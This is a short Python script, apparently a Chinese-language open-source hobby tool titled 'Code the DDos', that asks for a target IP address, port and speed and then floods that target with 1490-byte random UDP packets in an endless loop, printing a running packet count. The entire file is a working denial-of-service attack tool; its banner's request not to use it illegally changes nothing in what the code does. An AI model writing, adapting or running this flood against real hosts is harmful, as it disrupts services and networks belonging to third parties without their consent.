import sys #变量和函数
import os  #操作系统依赖的功能
import time #各种与时间相关的功能
import socket #访问底层网络接口的方法
import random #生成随机数的函数
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Code the DDos")
print ("")
print ("<=========================================================================>")
print("")
print ("      🤔作者          : Code                                         ")
print ("      🎪作者github    : https://github.com/YU-Hang-git               ")
print ("      🦊kali-QQ学习群 : 暂时关闭                                     ")
print ("      🧋CSDN博客      : https://blog.csdn.net/2301_82206160?type=blog") 
print("")
print ("                       < 此项目为开源 允许二次修改 >                        ")
print ("<=========================================================================>" )
print (" ")
print ("            -----------------[请勿用于违法用途]----------------- ")
print (" ")
ip = input("  > 请输入IP : ")
port = int(input("  > 攻击端口 : "))
sd = int(input("  > 攻击速度: "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)

